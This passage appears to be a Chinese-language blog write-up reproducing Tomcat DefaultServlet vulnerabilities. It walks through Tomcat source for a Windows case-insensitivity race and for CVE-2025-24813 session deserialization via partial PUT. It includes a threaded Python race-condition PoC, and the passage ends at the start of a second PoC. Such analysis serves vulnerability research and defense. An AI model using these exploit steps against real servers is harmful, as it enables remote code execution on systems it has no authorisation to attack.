+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bat" data-lang="bat"><span style="display:flex;"><span><span style="color:#66d9ef">set</span> JPDA_ADDRESS=5005
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> JPDA_TRANSPORT=dt_socket
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">set</span> CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005
+</span></span><span style="display:flex;"><span>startup
+</span></span></code></pre></div><p>运行这个文件即可debug。</p>
+<h2 id="漏洞分析-1">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析-1">#</a></h2>
+<p>当访问以<code>.jsp</code>或<code>.jspx</code>结尾的文件时会进入<code>JspServlet</code>处理，会尝试查找相应的JSP文件。最终会调用到<code>org.apache.catalina.webresources.AbstractFileResourceSet#file</code>方法，堆栈如下：</p>
+<pre tabindex="0"><code>org.apache.catalina.webresources.AbstractFileResourceSet#file
+org.apache.catalina.webresources.DirResourceSet#getResource
+org.apache.catalina.webresources.StandardRoot#getResourceInternal
+org.apache.catalina.webresources.CachedResource#validateResource
+org.apache.catalina.webresources.Cache#getResource
+org.apache.catalina.webresources.StandardRoot#getResource
+org.apache.catalina.webresources.StandardRoot#getResource
+org.apache.catalina.core.ApplicationContext#getResource
+org.apache.catalina.core.ApplicationContextFacade#getResource
+org.apache.jasper.servlet.JspServlet#serviceJspFile
+org.apache.jasper.servlet.JspServlet#service
+javax.servlet.http.HttpServlet#service
+</code></pre><p>其代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">final</span> File <span style="color:#a6e22e">file</span>(String name, <span style="color:#66d9ef">boolean</span> mustExist) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (name.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;/&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">fileBase</span>, name);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (name.<span style="color:#a6e22e">endsWith</span>(<span style="color:#e6db74">&#34;/&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> file.<span style="color:#a6e22e">isFile</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (mustExist <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>file.<span style="color:#a6e22e">canRead</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRoot</span>().<span style="color:#a6e22e">getAllowLinking</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> file;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (JrePlatform.<span style="color:#a6e22e">IS_WINDOWS</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isInvalidWindowsFilename</span>(name)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        String canPath <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            canPath <span style="color:#f92672">=</span> file.<span style="color:#a6e22e">getCanonicalPath</span>();
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException var6) {
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (canPath <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> canPath.<span style="color:#a6e22e">startsWith</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">canonicalBase</span>)) {
+</span></span><span style="display:flex;"><span>            String absPath <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">normalize</span>(file.<span style="color:#a6e22e">getAbsolutePath</span>());
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">absoluteBase</span>.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&gt;</span> absPath.<span style="color:#a6e22e">length</span>()) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                absPath <span style="color:#f92672">=</span> absPath.<span style="color:#a6e22e">substring</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">absoluteBase</span>.<span style="color:#a6e22e">length</span>());
+</span></span><span style="display:flex;"><span>                canPath <span style="color:#f92672">=</span> canPath.<span style="color:#a6e22e">substring</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">canonicalBase</span>.<span style="color:#a6e22e">length</span>());
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (canPath.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&gt;</span> 0) {
+</span></span><span style="display:flex;"><span>                    canPath <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">normalize</span>(canPath);
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#f92672">!</span>canPath.<span style="color:#a6e22e">equals</span>(absPath) <span style="color:#f92672">?</span> <span style="color:#66d9ef">null</span> : file;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>假如发送如下数据包：</p>
+<pre tabindex="0"><code>GET /evil.jsp HTTP/1.1
+Connection: close
+</code></pre><p>这里获取了两个path：<code>absPath</code>和<code>canPath</code>，<code>absPath</code>是URL中的PATH也就是<code>/evil.jsp</code>。</p>
+<p>而<code>canPath</code>比较特殊，如果webapps下有<code>evil.JSP</code>，则<code>canPath</code>的值为<code>/evil.JSP</code>，因为在windows不区分大小写。但此时因为<code>canPath</code>与<code>absPath</code>不同，函数会返回null。</p>
+<p>return之后，回到<code>org.apache.catalina.webresources.DirResourceSet#getResource</code>方法，代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> WebResource <span style="color:#a6e22e">getResource</span>(String path) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">checkPath</span>(path);
+</span></span><span style="display:flex;"><span>    String webAppMount <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getWebAppMount</span>();
+</span></span><span style="display:flex;"><span>    WebResourceRoot root <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRoot</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (path.<span style="color:#a6e22e">startsWith</span>(webAppMount)) {
+</span></span><span style="display:flex;"><span>        File f <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">file</span>(path.<span style="color:#a6e22e">substring</span>(webAppMount.<span style="color:#a6e22e">length</span>()), <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> EmptyResource(root, path);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>f.<span style="color:#a6e22e">exists</span>()) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> EmptyResource(root, path, f);
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (f.<span style="color:#a6e22e">isDirectory</span>() <span style="color:#f92672">&amp;&amp;</span> path.<span style="color:#a6e22e">charAt</span>(path.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">-</span> 1) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) {
+</span></span><span style="display:flex;"><span>                path <span style="color:#f92672">=</span> path <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span>;
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> FileResource(root, path, f, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isReadOnly</span>(), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getManifest</span>());
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> EmptyResource(root, path);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>此时<code>f = null</code>，会return一个<code>EmptyResource</code>，最终返回404。</p>
+<p>但如果webapps下没有<code>evil.JSP</code>(无论大小写)。那么<code>canPath</code>的值会跟<code>absPath</code>相同。
+<img alt="3" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/3.png"></p>
+<p>此时<code>file</code>方法会将这个指向<code>/evil.jsp</code>的File对象返回。</p>
+<p>紧接着<code>getResource</code>方法会检查其是否存在：
+<img alt="4" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/4.png"></p>
+<p>此处的<code>f.exists()</code>在windows写也不区分大小写。</p>
+<p>所以这里存在一个竞争空间，大前提是目前无法直接上传<code>jsp</code>和<code>jspx</code>文件，但<code>JspServlet</code>只接受这两种后缀，所以想通过条件竞争使得访问<code>/evil.jsp</code>时可以执行<code>/evil.JSP</code>文件</p>
+<p>如果在<code>file</code>方法执行时<code>evil.JSP</code>不存在，而到了<code>getResource</code>方法里写入了<code>evil.JSP</code>，那么就可以通过<code>JspServlet</code>执行<code>evil.JSP</code>文件了。</p>
+<p>POC：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> threading
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">POC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_random_string</span>(length):
+</span></span><span style="display:flex;"><span>    characters <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(characters, k<span style="color:#f92672">=</span>length))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">put_file</span>(filename : str):
+</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>put(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.JSP&#39;</span>, data<span style="color:#f92672">=</span>payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file</span>(filename : str):
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">+</span> filename <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.jsp&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">404</span>:
+</span></span><span style="display:flex;"><span>        print()
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] exploit success&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> generate_random_string(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    get_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>get_file, args<span style="color:#f92672">=</span>[filename])
+</span></span><span style="display:flex;"><span>    put_thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>put_file, args<span style="color:#f92672">=</span>[filename])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    get_thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>    put_thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    get_thread<span style="color:#f92672">.</span>join()
+</span></span><span style="display:flex;"><span>    put_thread<span style="color:#f92672">.</span>join()
+</span></span></code></pre></div><p>多试几次就能成功。但这个过程会上传很多文件：</p>
+<p><img alt="5" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/5.png"></p>
+<p>不过如果给<code>DefaultServlet</code>配置了readOnly为false的话，那么就可以用DELETE请求删除文件。详见<a href="https://whoamianony.top/posts/apache-tomcat-rce-via-write-enabled-default-servlet/">WHOAMI师傅的blog</a></p>
+<h1 id="cve-2025-24813">CVE-2025-24813<a hidden class="anchor" aria-hidden="true" href="#cve-2025-24813">#</a></h1>
+<blockquote>
+<p>9.0.0.M1 &lt;= tomcat &lt;= 9.0.98</p>
+<p>10.1.0-M1 &lt;= tomcat &lt;= 10.1.34</p>
+<p>11.0.0-M1 &lt;= tomcat &lt;= 11.0.2</p>
+</blockquote>
+<h2 id="环境搭建-2">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建-2">#</a></h2>
+<p>环境依然是tomcat windows 9.0.1，开启DefaultServlet，和上面一样。</p>
+<p>除此之外放一个commons-collections3.2.1的jar包到lib目录下。</p>
+<p>还需要配置<code>context.xml</code>开启SESSION持久化：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;Manager</span> <span style="color:#a6e22e">className=</span><span style="color:#e6db74">&#34;org.apache.catalina.session.PersistentManager&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Store</span> <span style="color:#a6e22e">className=</span><span style="color:#e6db74">&#34;org.apache.catalina.session.FileStore&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Manager&gt;</span>
+</span></span></code></pre></div><h2 id="漏洞分析-2">漏洞分析<a hidden class="anchor" aria-hidden="true" href="#漏洞分析-2">#</a></h2>
+<p>Tomcat曾经爆出过一个Session反序列化的漏洞，编号是：<code>CVE-2020-9484</code>。</p>
+<p>有关Session读取的方法<code>FileStore#load</code>代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Session <span style="color:#a6e22e">load</span>(String id) <span style="color:#66d9ef">throws</span> ClassNotFoundException, IOException {
+</span></span><span style="display:flex;"><span>    File file <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">file</span>(id);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file.<span style="color:#a6e22e">exists</span>()) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        Context context <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getManager</span>().<span style="color:#a6e22e">getContext</span>();
+</span></span><span style="display:flex;"><span>        Log contextLog <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">getLogger</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (contextLog.<span style="color:#a6e22e">isDebugEnabled</span>()) {
+</span></span><span style="display:flex;"><span>            contextLog.<span style="color:#a6e22e">debug</span>(sm.<span style="color:#a6e22e">getString</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getStoreName</span>() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.loading&#34;</span>, <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{id, file.<span style="color:#a6e22e">getAbsolutePath</span>()}));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ClassLoader oldThreadContextCL <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">bind</span>(Globals.<span style="color:#a6e22e">IS_SECURITY_ENABLED</span>, (ClassLoader)<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Throwable var7;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(file.<span style="color:#a6e22e">getAbsolutePath</span>());
+</span></span><span style="display:flex;"><span>            var7 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getObjectInputStream</span>(fis);
+</span></span><span style="display:flex;"><span>                Throwable var9 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>                    StandardSession session <span style="color:#f92672">=</span> (StandardSession)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">manager</span>.<span style="color:#a6e22e">createEmptySession</span>();
+</span></span><span style="display:flex;"><span>                    session.<span style="color:#a6e22e">readObjectData</span>(ois);
+</span></span><span style="display:flex;"><span>                    session.<span style="color:#a6e22e">setManager</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">manager</span>);
+</span></span><span style="display:flex;"><span>                    StandardSession var11 <span style="color:#f92672">=</span> session;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span> var11;
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">catch</span> (Throwable var49) {
+</span></span><span style="display:flex;"><span>                    var9 <span style="color:#f92672">=</span> var49;
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">throw</span> var49;
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>        ............
+</span></span></code></pre></div><p>tomcat的Session机制类似PHP，将序列化数据保存在文件中，通过Cookie中的JSESSIONID来查找文件并通过<code>session.readObjectData(ois);</code><strong>触发反序列化</strong>。而旧版本中JSESSIONID没有过滤<code>..</code>导致可以目录穿越从而反序列化任意文件。</p>
+<p>而<code>CVE-2025-24813</code>的利用方法是直接向Session存储目录下写文件。</p>
+<p><code>DefaultServlet#doPut</code>方法会从Header中获取Range，如果指定了Range则会先进入<code>executePartialPut</code>方法写入临时文件，然后再写入webapps下。代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doPut</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">readOnly</span>) {
+</span></span><span style="display:flex;"><span>        resp.<span style="color:#a6e22e">sendError</span>(403);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        String path <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getRelativePath</span>(req);
+</span></span><span style="display:flex;"><span>        WebResource resource <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resources</span>.<span style="color:#a6e22e">getResource</span>(path);
+</span></span><span style="display:flex;"><span>        Range range <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">parseContentRange</span>(req, resp);
+</span></span><span style="display:flex;"><span>        InputStream resourceInputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (range <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>                File contentFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">executePartialPut</span>(req, range, path);
+</span></span><span style="display:flex;"><span>                resourceInputStream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(contentFile);
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                resourceInputStream <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getInputStream</span>();
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>    .........
+</span></span></code></pre></div><p>Range的写法是<code>Content-Range: bytes 0-100/110</code></p>
+<p>Windows下临时文件默认的临时路径为<code>{tomcat_base_path}\work\Catalina\localhost\ROOT</code>。其他系统路径可能不同，<strong>但Session文件的默认存储位置跟存放临时文件的路径是一样的。</strong></p>
+<p>tomcat查找Session文件的过程是：</p>
+<ol>
+<li>从Cookie中获得JSESSIONID</li>
+<li>JSESSIONID后面加上<code>.session</code>后缀</li>
+<li>然后再Session存储路径下查找该文件。</li>
+</ol>
+<p><code>executePartialPut</code>方法代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> File <span style="color:#a6e22e">executePartialPut</span>(HttpServletRequest req, Range range, String path) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>    File tempDir <span style="color:#f92672">=</span> (File)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getServletContext</span>().<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;javax.servlet.context.tempdir&#34;</span>);
+</span></span><span style="display:flex;"><span>    String convertedResourcePath <span style="color:#f92672">=</span> path.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>    File contentFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File(tempDir, convertedResourcePath);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (contentFile.<span style="color:#a6e22e">createNewFile</span>()) {
+</span></span><span style="display:flex;"><span>        contentFile.<span style="color:#a6e22e">deleteOnExit</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    RandomAccessFile randAccessContentFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> RandomAccessFile(contentFile, <span style="color:#e6db74">&#34;rw&#34;</span>);
+</span></span><span style="display:flex;"><span>    Throwable var8 <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    ............
+</span></span></code></pre></div><p>会将<code>/</code>换成<code>.</code>，所以用<code>/exp.session</code>和<code>/exp/session</code>均可以写入<code>.exp.session</code>文件。</p>
+<p>需要注意，这个过程中会根据提供的Range写入数据：
+<img alt="6" loading="lazy" src="/posts/tomcat%E4%B8%ADdefaultservlet%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/images/6.png"></p>
+<p>所以Header中的Range要足够大。</p>
+<p>利用流程是:</p>
+<ol>
+<li>通过<code>executePartialPut</code>将序列化数据写入<code>.exp.session</code></li>
+<li>携带<code>Cookie：JSESSIONID=.exp</code>即可将文件内容反序列化。</li>
+</ol>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_random_string</span>(length):
+</span></span><span style="display:flex;"><span>    characters <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(characters, k<span style="color:#f92672">=</span>length))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>filename <span style="color:#f92672">=</span> generate_random_string(<span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 反序列化payload</span>
